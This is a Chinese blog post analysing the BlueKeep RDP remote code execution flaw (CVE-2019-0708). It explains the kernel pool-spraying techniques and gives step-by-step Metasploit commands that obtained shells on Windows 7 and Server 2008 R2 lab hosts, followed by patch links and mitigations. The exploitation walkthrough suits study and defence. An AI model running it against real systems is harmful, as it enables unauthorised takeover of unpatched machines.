# Windows RDP 的 RCE 漏洞分析和复现（CVE-2019-0708） - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/11482322.html`](https://www.cnblogs.com/backlion/p/11482322.html)

# 0x00 漏洞描述

Windows 系列服务器于 2019 年 5 月 15 号，被爆出高危漏洞，该漏洞影响范围较广如：windows2003、windows2008、windows2008 R2、windows xp 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。这个漏洞是今年来说危害严重性最大的漏洞，跟之前的勒索，永恒之蓝病毒差不多。CVE-2019-0708 漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过 rdp 协议进行连接发送恶意代码执行命令到服务器中去。如果被攻击者利用，会导致服务器入侵，中病毒，像 WannaCry 永恒之蓝漏洞一样大规模的感染。2019 年 9 月 7 日晚上凌晨 1 点左右，metaspolit 更新了漏洞利用程序

在 2019 年 5 月，微软发布了针对远程代码执行漏洞 CVE-2019-0708 的补丁更新，该漏洞也称为“BlueKeep”，漏洞存在于远程桌面服务（RDS）的代码中。此漏洞是预身份验证，无需用户交互，因此具有潜在武器化蠕虫性性漏洞利用的危险。如果成功利用此漏洞，则可以使用“系统”权限执行任意代码。Microsoft 安全响应中心的建议表明这个漏洞也可能会成为一种蠕虫攻击行为，类似于 Wannacry 和 EsteemAudit 等攻击行为。由于此漏洞的严重性及其对用户的潜在影响，微软采取了罕见的预警步骤，为不再受支持的 Windows XP 操作系统发布补丁，以保护 Windows 用户。

# 0x01 漏洞影响

该漏洞影响旧版本的 Windows 系统，包括：
Windows 7、Windows Server 2008 R2、Windows Server 2008、Windows 2003、Windows XP。
Windows 8 和 Windows 10 及之后版本不受此漏洞影响。

# 0x02  cve_2019_0708_bluekeep_rce.rb 介绍 

此 PR 为 CVE-2019-0708（又名 BlueKeep）添加了一个漏洞利用模块，该模块通过 RDP 利用远程 Windows 内核释放后使用漏洞。rdp termdd.sys 驱动程序未正确处理绑定到仅限内部的通道 ms_t120，从而允许格式错误的断开连接提供程序指示消息导致释放后被使用。利用可控制的数据和远程非分页面池堆喷射，使用空闲信道的间接调用小工具来实现任意代码执行。

这个模块最初由@zerosum0x0 和@ryhanson 开发，然后由@oj、@zerosteiner、@rickoates、@wvu-r7、@bwatters-r7、@wchen-r7、@tsellers-r7、@todb-r7 和其他人进一步开发。为了利用 metasploit 中的 rdp 和其他库增强功能，该模块从 python 外部模块移植到本机 ruby 模块。果您希望检查并将其与当前实现进行比较，则原始 Python 模块位于提交历史记录中。

该模块当前以 64 位版本的 Windows 7 和 Windows Server 2008 R2 为目标。对于 Windows Server 2008 R2，需要修改注册表项以启用通过 rdpsnd 通道进行堆喷射，但仍有其他可能使用在所有 Windows 操作系统上默认启用的备用通道。

由于用户需要提供额外的目标信息或有使目标主机崩溃的风险，该模块目前被列为手动模块。该模块实现了一个默认的仅指向的目标选项，该选项只检查易受攻击的主机，并显示有关特定目标操作系统的一些初始信息，但用户需要根据辅助侦察指定更精确的目标或直到进一步改进模块可以在运行时更准确地确定目标内核内存布局。

有针对没有打补丁的，裸机、VirtualBox、VMWare 和 Hyper-V 的特定目标，尽管目标环境中可能还有其他变量，这些变量会额外转移基础地址以进行修饰。

# 0x03 漏洞分析 

## 1\. PDU

根据 MS-RDPBCGR（远程桌面协议：连接和远程处理）文档，位图缓存 PDU 的全名是 TS_BITMAPCACHE_PERSISTENT_LIST_PDU，密钥列表 PDU 数据被嵌入在永久密钥列表 PDU 中。永久密钥列表 PDU 是在客户端从客户端发送到服务器的 RDP 连接序列 PDU

RDP 连接序列的连接完成阶段，如图 1 所示。

![](img/701534d9ab93f285954b47e95df25fd2.png)

                                                                                 图 1.远程桌面协议（RDP）连接顺序

永久密钥列表 PDU 报头是通用 RDP PDU 报头，其构造如下，如图 2 所示：tpktHeader（4 字节）+ x224Data（3 字节）+ mcsSDrq（变量）+ securityHeader（变量）。

![](img/777c440238ad0ac385d3e546f9c94533.png)

                                                                                               图 2.客户端持久密钥列表 PDU

根据 MS-RDPBCGR 文档，TS_BITMAPCACHE_PERSISTENT_LIST_PDU 是一个结构，其中包含从先前会话中发送的高速缓存位图中保存的高速缓存位图密钥列表。如图 3 所示。

![](img/125e11d34f31c786fe7634d5feb5da48.png)

                                                    图 3.持久密钥列表 PDU 数据（BITMAPCACHE PERSISTENT LIST PDU）

根据设计，位图缓存 PDU 用于 RDP 客户端通知服务器它具有与密钥相关联的位图的本地副本，这表明服务器不需要将位图重新发送到客户端。基于 MS-RDPBCGR 文档，Bitmap PDU 有四个特征：

*   RDP 服务器将分配内核池来存储缓存的位图键。
*   RDP 服务器分配的内核池大小可以通过结构中的“WORD 值”numEntriesCache X 字段来控制，而 BITMAPCACHE PERSISTENT 中的 totalEntriesCache X 是 RDP 客户端的 LIST 结构。
*   位图缓存 PDU 可以合法地多次发送，因为位图密钥可以在多个持久密钥列表 PDU 中发送，每个 PDU 使用 bBitMask 字段中的标记来标记。
*   位图键的数量限制为 169。

基于 BITMAPCACHE PERSISTENT LIST PDU 的这四个特性，如果可以绕过限制为 169 的位图键数量，那么就可以将任意数据写入内核。

### 2.如何使用 PDU 将数据写入内核

根据 MS-RDPBCGR 文档，正常解密的 BITMAPCACHE PERSISTENT LIST PDU 如下所示：

```
f2 00 -> TS_SHARECONTROLHEADER::totalLength = 0x00f2 = 242 bytes
17 00 -> TS_SHARECONTROLHEADER::pduType = 0x0017

0x0017

= 0x0010 | 0x0007

= TS_PROTOCOL_VERSION | PDUTYPE_DATAPDU

ef 03 -> TS_SHARECONTROLHEADER::pduSource = 0x03ef = 1007

ea 03 01 00 -> TS_SHAREDATAHEADER::shareID = 0x000103ea

00 -> TS_SHAREDATAHEADER::pad1

01 -> TS_SHAREDATAHEADER::streamId = STREAM_LOW (1)

00 00 -> TS_SHAREDATAHEADER::uncompressedLength = 0

2b -> TS_SHAREDATAHEADER::pduType2 =

PDUTYPE2_BITMAPCACHE_PERSISTENT_LIST (43)

00 -> TS_SHAREDATAHEADER::generalCompressedType = 0

00 00 -> TS_SHAREDATAHEADER::generalCompressedLength = 0

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::numEntries[0] = 0

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::numEntries[1] = 0

19 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::numEntries[2] = 0x19 = 25

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::numEntries[3] = 0

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::numEntries[4] = 0

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::totalEntries[0] = 0

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::totalEntries[1] = 0

19 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::totalEntries[2] = 0x19 = 25

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::totalEntries[3] = 0

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::totalEntries[4] = 0

03 -> TS_BITMAPCACHE_PERSISTENT_LIST::bBitMask = 0x03

0x03

= 0x01 | 0x02

= PERSIST_FIRST_PDU | PERSIST_LAST_PDU

00 -> TS_BITMAPCACHE_PERSISTENT_LIST::Pad2

00 00 -> TS_BITMAPCACHE_PERSISTENT_LIST::Pad3

TS_BITMAPCACHE_PERSISTENT_LIST::entries:

a3 1e 51 16 -> Cache 2, Key 0, Low 32-bits (TS_BITMAPCACHE_PERSISTENT_LIST_ENTRY::Key1)

48 29 22 78 -> Cache 2, Key 0, High 32-bits (TS_BITMAPCACHE_PERSISTENT_LIST_ENTRY::Key2)

61 f7 89 9c -> Cache 2, Key 1, Low 32-bits (TS_BITMAPCACHE_PERSISTENT_LIST_ENTRY::Key1)

cd a9 66 a8 -> Cache 2, Key 1, High 32-bits (TS_BITMAPCACHE_PERSISTENT_LIST_ENTRY::Key2)
```

在内核模块 RDPWD.sys 中，函数例程 ShareClass :: SBC_HandlePersistentCacheList 负责解析 BITMAPCACHE PERSISTENT LIST PDU。当结构中的 bBitMask 字段被设置为位值 0x01 时，它指出当前 PDU 是 PERSIST FIRST PDU。然后，SBC_HandlePersistentCacheList 将调用 WDLIBRT_MemAlloc 来分配内核池（分配内核内存）以存储持久位图缓存键，如图 4 所示。值 0x00 表示当前 PDU 是 PERSIST MIDDLE PDU。值 0x02 表示当前 PDU 是 PERSIST LAST PDU。解析 PERSIST MIDDLE PDU 和 PERSIST LAST PDU 时，SBC_HandlePersistentCacheList 会将位图缓存键复制到之前分配的内存中，如图 5 所示。

 ![](img/558edb99992fb4883ad1c256262a56f1.png)

                                                 图 4\. SBC_HandlePersistentCacheList 池分配和 totalEntriesCacheLimit 检查

![](img/2f57168dc826b63d3787375710294055.png)

                                                图 5\. SBC_HandlePersistentCacheList 复制位图缓存键

Windows 7 x86 上的堆栈跟踪和 SBC_HandlePersistentCacheList 的 TS_BITMAPCACHE_PERSISTENT_LIST 结构的第二个参数如图 6 和图 7 所示。

![](img/3dcdc887601d10d2e97e877cd5146fe6.png)

                                                   图 6\. SBC_HandlePersistentCacheList 堆栈跟踪

![](img/a8673ba1e39dce51feb44cbfa96d8bc5.png)

                             图 7\. TS_BITMAPCACHE_PERSISTENT_LIST 结构作为 SBC_HandlePersistentCacheList 的第二个参数

如图 4 所示，bitmapCacheListPoolLen = 0xC *（总长度+4）和总长度= totalEntriesCache0 + totalEntriesCache1 + totalEntriesCache2 + totalEntriesCache3 + totalEntriesCache4。

基于此公式，我们可以设置“WORD 值”totalEntriesCache X = 0xffff，使 bitmapCacheListPoolLen 为最大值。但是，对于图 8 中显示的每个 totalEntriesCache X，都有一个 totalEntriesCacheLimit 检查.

totalEntriesCacheLimit X 来自 TS_BITMAPCACHE_CAPABILITYSET_REV2 结构，该结构在通过 RDPWD 调用 DCS_Init 时在 CAPAPI_LOAD_TS_BITMAPCACHE_CAPABILITYSET_REV2 函数中启动，如图 8 所示。这将在解析确认 PDU 时组合在 CAPAPI_COMBINE_TS_BITMAPCACHE_CAPABILITYSET_REV2 函数中，如图 9 所示。

![](img/04749e6e181504c292e88e2c3b2130dd.png)

                                                       图 8\. RDPWD！CAPAPI_LOAD_TS_BITMAPCACHE_CAPABILITYSET_REV2

 ![](img/b2b98cbecce3d048970ed8ee46796862.png)

                                                    图 9\. RDPWD！CAPAPI_COMBINE_TS_BITMAPCACHE_CAPABILITYSET_REV2

CAPAPI_COMBINE_TS_BITMAPCACHE_CAPABILITYSET_REV2 将服务器启动的 NumCellCaches（0x03）和 totalEntriesCacheLimit [0-4]（0x258,0x258,0x10000,0x0,0x0）与客户端请求 NumCellCaches（0x03）和 totalEntriesCache [0-4]（0x80000258,0x80000258,0x8000fffc，0x0）组合在一起，0x0），如图 9 中的 edx 和 esi 寄存器所示。

客户端可以控制 NumCellCaches 和 totalEntriesCache [0-4]，如图 10 所示，但它们不能通过服务器启动的 NumCellCaches（0x03）和 totalEntriesCacheLimit [0-4] ]（0x258,0x258,0x10000,0x0,0x0）如图 11 所示。

![](img/6a65ad6e1b933045eeca96ea646d5bb3.png)

                                                                    图 10\. TS_BITMAPCACHE_CAPABILITYSET_REV2

![](img/92e7999a1489d893a25610f90b94d3c7.png)

                                  图 11\. CAPAPI_COMBINE_TS_BITMAPCACHE_CAPABILITYSET_REV2 函数

有了这些信息，我们可以计算出最大 bitmapCacheListPoolLen = 0xC *（0x10000 + 0x258 + 0x258 + 4）= 0xc3870，理论上可以控制内核池中的 0x8 *（0x10000 + 0x258 + 0x258 + 4）= 0x825a0 字节数据，如图所示在图 12 中。

![](img/a81b426f0c0eea647a9fe617ea3dda1d.png)

                                                      图 12.持久密钥列表 PDU 内存转储

但是，观察到并非所有数据都可以由位图缓存列表池中的 RDP 客户端按预期被控制。每个 8 字节受控数据之间存在 4 字节不受控制的数据（索引值），这对于 shellcode 存放是不太友好的。此外，0xc3870 大小的内核池不能多次分配，因为持久密钥列表 PDU 只能合法地发送一次。但是，仍然存在特定的统计特征，即内核池将在相同的内存地址处分配。此外，在位图缓存列表池分配之前总是有一个 0x2b522c（在 x86 上）或 0x2b5240（在 x64 上）内核大小的池，这对于堆分配非常有用，尤其是在 x64 上，如图 13 所示。

![](img/ef4860b27e94a91053963b3e7b703bdd.png)

图 13.持久密钥列表 PDU 统计特性

### 3.刷新 Rect PDU

根据 MS-RDPBCGR 文档，刷新 PDU 会使 RDP 客户端请求服务器重新分配一个会话。该结构包括通用 PDU 头和图 14 中所示的 refreshRectPduData（变量）。

![](img/d252e7d59807717be7a5bf444ada6c67.png)

                                                                                                    图 14.刷新 Rect PDU 数据

numberOfAreas 字段是一个 8 位无符号整数，用于定义 areasToRefresh 字段中的包含 Rectangle 结构的数量。areaToRefresh 字段是 TS_RECTANGLE16 结构的数组，如图 15 所示。

![](img/c9639a4fd0a83b0bdb941bd9b95242fb.png)

                                                                       图 15.包含 Rectangle（TS_RECTANGLE16）

Refresh Rect PDU 通过一系列“Inclusive Rectangles”操作通知服务器，以使服务器重新分配一个会话。基于默认通道，通道 ID 为 0x03ea（服务器通道 ID）。连接序列完成后，如图 1 所示，RDP 服务器可以接收/解析刷新矩阵 PDU，最重要的是，可以合法地多次发送。虽然对于 TS_RECTANGLE16 结构仅限于 8 个字节，意味着 RDP 客户端只能控制 8 个字节，但仍然可以将任意数据写入内核。

### 4.使用 Refresh Rect PDU 将数据写入内核

正常解密的 Refresh Rect PDU 如图 16 所示。

![](img/352ba70d3f6da9c1640f24c2b991252a.png)

                                                                          图 16.解密的 Refresh Rect PDU

内核模块 RDPWD.sys 代码函数 WDW_InvalidateRect 负责解析 Refresh Rect PDU，如下面的图 17 所示。

![](img/10befea0e3644196522efba3b88f4d0f.png)

                     图 17\. RDPWD！WDW_InvalidateRect 堆栈跟踪

如图 18 所示，WDW_InvalidateRect 函数将解析 Refresh Rect PDU 流并从流中检索 numberOfAreas 字段作为循环计数。作为字节类型字段，numberOfAreas 的最大值为 0xFF，因此最大循环计数为 0xFF。在循环中，WDW_InvalidateRect 函数将获得 TS_RECTANGLE16 结构中的左，上，右和下字段，将它们放在堆栈中的结构中，并将其作为 WDICART_IcaChannelInput 的第 5 个参数。这里要提到的是，WDICART_IcaChannelInput 的第 6 个参数是常数 0x808，我们将展示它如何有效地实现堆喷。

![](img/ffbb49866f0eed5811cc9a32af03ecab.png)

                                                                        图 18\. RDPWD！WDW_InvalidateRect 函数

WDICART_IcaChannelInput 最终将调用内核模块 termdd.sys 函数 IcaChannelInputInternal。如图 19 所示，如果一系列条件检查为 True，则函数 IcaChannelInputInternal 将调用 ExAllocatePoolWithTag 来分配 inputSize_6th_para + 0x20 大小的内核池。因此，当函数 IcaChannelInputInternal 由 RDPWD！WDW_InvalidateRect，inputSize_6th_para = 0x808 调用时，内核池的大小为 0x828。

![](img/7e27eeda7e8b9eecfd3916ac1d7411b9.png)

                                            图 19\. termdd！IcaChannelInputInternal ExAllocatePoolWithTag 和 memcpy

如果内核池分配成功，将调用 memcpy 将 input_buffer_2 复制到新分配的内核池内存。图 20 显示了当调用者是 RDPWD！WDW_InvalidateRect 时 memcpy 的参数。

![](img/aa8f56bba0bbb7a49fe720458a767bab.png)

                        图 20\. termdd！IcaChannelInputInternal memcpy windbg 转储

有趣的是，函数 memcpy 的源地址来自 RDPWD！WDW_InvalidateRect 堆栈上的 stRect 结构，只有前 3 个 DWORD 在 RDPWD！WDW_InvalidateRect 中设置，如图 21 所示。剩余内存是堆栈上未初始化的内容，很容易导致信息泄露。此外，使用 0x808 大小的内存来存储 12 个字节的数据对于堆喷也是很友好的。

![](img/d6ca23e374206ad3904d843751ca24f6.png)

                                          图 21\. RDPWD！WDW_InvalidateRect stRect 结构集

使用此信息，当 RDP 客户端发送一个具有 0xFF 的 numberOfAreas 字段的 Refresh Rect PDU 时，RDP 服务器将调用 termdd！IcaChannelInputInternal 0xFF 次。每个 termdd！IcaChannelInputInternal 调用将分配 0x828 内核池内存并将 8 个字节的客户端控制的 TS_RECTANGLE16 结构复制到该内核池。因此，numberOfAreas 字段为 0xFF 的一个 Refresh Rect PDU 将分配 0xFF 数量的 0x828 大小的内核池。理论上，如果 RDP 客户端发送刷新矩阵 PDU 0x200 次，则 RDP 服务器将分配大约 0x20000 的 0x828 大小的非分页内核池。考虑到 0x828 大小的内核池将与 0x1000 对齐，它们将跨越内核池的非常大的范围，同时，客户端控制的 8 个字节的数据将被复制到每个 0x1000 内核池中固定的 0x02c 偏移量。如图 22 所示，我们在内核中使用 Refresh Rect PDU 获得稳定的 pool spray。

![](img/e60fcc8882a3d0fefe8b9e92c954e887.png)

                                              图 22\. RDPWD！WDW_InvalidateRect pool spray

有些情况下，当指针（在图 23 中表示为变量 v14）被 termdd！IcaQueueReadChannelRequest 修改并且比较将为 False 时，不会调用 ExAllocatePoolWithTag 和 memcpy，如图 23 所示，该路由将进入例程 IcaCopyDataToUserBuffer，这将导致池分配不成功。但是，当多次发送 Refresh Rect PDU 时，即使存在一些不成功的池分配，我们仍然可以获得成功的内核池喷射。

此外，有些情况下一些内核池小号的 RDP 服务器使用完之后可以被释放，但是内核池的内容将不会被清零，使得我们喷到内核有效的利用使用数据。

![](img/17be7f74c60dd7c901e44c75ae23c8c4.png)

                                  图 23\. termdd！IcaChannelInputInternal IcaCopyDataToUserBuffer

### 5.RDPDR 客户端 name 请求 PDU

根据 MS-RDPEFS 文档，RDPDR 客户端名称请求 PDU 在[远程桌面协议：文件系统虚拟通道扩展]中指定，该扩展在名为 RDPDR 的静态虚拟通道上运行。MS-RDPEFS 协议的目的是将访问从服务器重定向到客户端文件系统。客户端名称请求是从客户端发送到服务器的第二个 PDU，如图 24 所示。

![](img/d45fd5cf42c4faf953d07ead999ea212.png)

                                        图 24.文件系统虚拟通道扩展协议初始化

客户端名称请求 PDU 用于客户端将其机器名称发送到服务器，如图 25 所示。

![](img/5b88a428bfc244f7ccfd104a6ee47515.png)

                                      图 25.客户端名称请求（DR_CORE_CLIENT_NAME_REQ）

标头是四个字节 RDPDR_HEADER，其中 Component 字段设置为 RDPDR_CTYP_CORE，PacketId 字段设置为 PAKID_CORE_CLIENT_NAME。ComputerNameLen 字段（4 个字节）是一个 32 位无符号整数，它指定 ComputerName 字段中的字节数。ComputerName 字段（变量）是 ASCII 或 Unicode 字符的可变长度数组，其格式由 UnicodeFlag 字段确定。这是一个标识客户端计算机名称的字符串。

### 6\.  使用 RDPDR 客户端 name 请求 PDU 将数据写入内核

关于 RDPDR 客户端名称请求 PDU，客户端名称请求 PDU 可以合法地多次发送，对于每个请求，RDP 服务器将分配内核池来存储该信息，最重要的是，PDU 的内容和长度可以由 RDP 客户端完全控制。这使它成为将数据写入内核内存的绝佳选择。

典型的 RDPDR 客户端名称请求 PDU 如图 26 所示。

![](img/16c3ed91b83ca0519d63cb9fb5afcf5c.png)

                                             图 26.客户端名称请求内存转储

当 RDP 服务器接收 RDPDR 客户端名称请求 PDU 时，调用内核模块 termdd.sys 中的函数 IcaChannelInputInternal 以首先调度信道数据，然后将调用 RDPDR 模块来解析客户端名称请求 PDU 的数据部分。客户端名称请求 PDU 的函数 IcaChannelInputInternal 应用与 Refresh Rect PDU 有相同的代码逻辑。它将调用 ExAllocatePoolWithTag 来分配带有标记 TSic 的内核内存，并使用 memcpy 将客户端名称请求数据复制到新分配的内核内存，如图 27 所示。

![](img/4fa367b8cafa3b257e00154bc24714e1.png)

                                                  图 27.客户端名称请求

到目前为止，我们已经证明复制的数据内容和长度都由 RDP 客户端控制，并且客户端名称请求 PDU 可以合法地多次发送。由于其灵活性和利用漏洞的特性，客户端名称请求 PDU 可用于回收 UAF 漏洞利用中的释放内核池，也可用于将 shellcode 写入内核池，甚至可以使用将连续的客户端控制数据喷射到内核内存中。

如图 28 所示，我们成功获得了稳定的池分配，并使用 RDPDR 客户端名称请求 PDU 将客户端控制的数据写入内核池。

![](img/766e0a31c8e3a3167891a249dca4fea7.png)

                             图 28.客户端名称请求稳定池分配

           上面介绍了使用 RDP PDU 将数据写入内核的三种方法。

*   位图缓存 PDU 允许 RDP 服务器在 0x2b5200 大小的池分配之后分配 0xc3870 大小的内核池并将可控数据写入其中，但不能多次执行 0xc3870 大小的内核池分配。
*   刷新 Rect PDU 可以喷射许多 0x828 大小的内核池，这些内核池是 0x1000 对齐的，并将 8 个可控字节写入每个 0x828 大小的内核池中。

# 0x04 漏洞复现

## 1.测试环境：

攻击机:kali2019.2 

靶机： win7 sp1 7601  和 win2008r2  sp1  english  standard

Windows7 SP1 下载地址:

ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/

 ![](img/528c12c6442b2ba9d3f1b1a4ba79f2ee.png)

win2008r2 sp1 下载地址：

[`download.microsoft.com/download/7/5/E/75EC4E54-5B02-42D6-8879-D8D3A25FBEF7/7601.17514.101119-1850_x64fre_server_eval_en-us-GRMSXEVAL_EN_DVD.iso`](http://download.microsoft.com/download/7/5/E/75EC4E54-5B02-42D6-8879-D8D3A25FBEF7/7601.17514.101119-1850_x64fre_server_eval_en-us-GRMSXEVAL_EN_DVD.iso)

![](img/7cdfae843c7d95215226b4cfeeac99b7.png)

## 2.复现测试

### (1).替换所需文件

cve_2019_0708_bluekeep_rce.rb   替换  /usr/share/metasploit-framework/modules/exploits/windows/rdp/             #如果没有 RDP 目录需要自检

rdp.rb   替换  /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb

rdp_scanner.rb 替换  /usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb

cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb

Kali 下执行如下命令进行替换：

wget [`raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb`](https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb)

wget [`github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb`](https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb)

wget [`github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb`](https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb)

wget [`github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb`](https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb)

cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/

cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/

cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/

cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/

### （2） 攻击 window7  sp1 漏洞复现

MSF 下执行如下命令：

msfconsole![](img/3c72c4257c228d18126f7be4c476b8b7.png)msf5>reload_all   #重新加载所有模块![](img/c7f35c1b6b509ca286dacc0a239faa23.png)

msf5 > search cve_2019_0708_bluekeep_rce

![](img/11e019a840066b2fc4a64eabbec666bc.png)

msf5>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) >info

![](img/908dc7877847d89404a1fe752a4350af.png)

![](img/eee41515a5fba96958c08c6ffc023e14.png)

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts 192.168.1.7

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 1 #如果设置目标为 3(set taget 3),可能会出现蓝屏现象，因此这里设置 target 1(我这里是 exis 中的主机）

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit 

meterprter>shell

![](img/56776dedf04c29b08a285972e18aa474.png)

 ![](img/43c93c395cfbec0975fdeb45970ea305.png)

可以看到成功反弹 win7sp1 系统 shell,根据实际情况选择 target（可以先测试 3 再测试 2 再测试 1）

### （2） 攻击 window 2008r2  sp1 漏洞复现

需要修改注册表[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\rdp-tcp\fDisableCam]值修改为 0(系统默认为 1）

在 MSF 下执行如下命令：

msf5 > search cve_2019_0708_bluekeep_rce

msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > info

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts 192.168.1.10

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rport 3389

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 2

msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit 

![](img/b9f615f0b3156fc36537695a3da9196b.png)

 ![](img/fda7d5703d85c712964544d32058f97c.png)

可以看到成功反弹出目标 win2008 r2 的 shell,该漏洞有点鸡肋，目前测试时 windows2008 r2 sp1 english 版本且需要修改注册表才能成功利用。

# 0x05 漏洞修复建议

CVE-2019-0708 漏洞修复补丁以及安全建议

有些 windows2008 系统打不了补丁的一般是数据中心版本，可以设置一下服务器，计算机右键属性-远程设置-仅允许运行使用网络基本身份验证的远程桌面的计算机连接（更安全）（N），在这行点勾，然后确认即可，可以临时的防止漏洞的攻击。

如果对补丁不知道该如何修复的，可以启用阿里云的端口安全策略，禁止掉 3389 远程端口，只允许自己的 IP 通信即可。

1.Windows Server 2008 漏洞补丁系列下载地址

Windows Server 2008 32 位系统:

http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu

Windows Server 2008 x64 位系统:

http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu

Windows Server 2008 R2 Itanium 系统:

http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu

Windows Server 2008 R2 x64 系统:

http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu

Windows Server 2008 Itanium:

http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu

2.Windows Server 2003 漏洞补丁系列下载地址

Windows Server 2003 32 位系统:

http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe

Windows Server 2003 64 位系统:

http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe

3\. Windows XP 漏洞补丁系列下载地址

Windows XP SP3 32 位系统:

http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe

Windows XP SP2 64 位系统:

http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe

Windows XP SP3 for XPe:

http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe

# 0x06 参考文献

https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/

https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/

https://wazehell.io/2019/05/22/cve-2019-0708-technical-analysis-rdp-rce/

https://github.com/rapid7/metasploit-framework/pull/12283

https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage

https://mp.weixin.qq.com/s/6ROmesCqtfkLFYliwidcEw
https://github.com/rapid7/metasploit-framework/pull/12283/files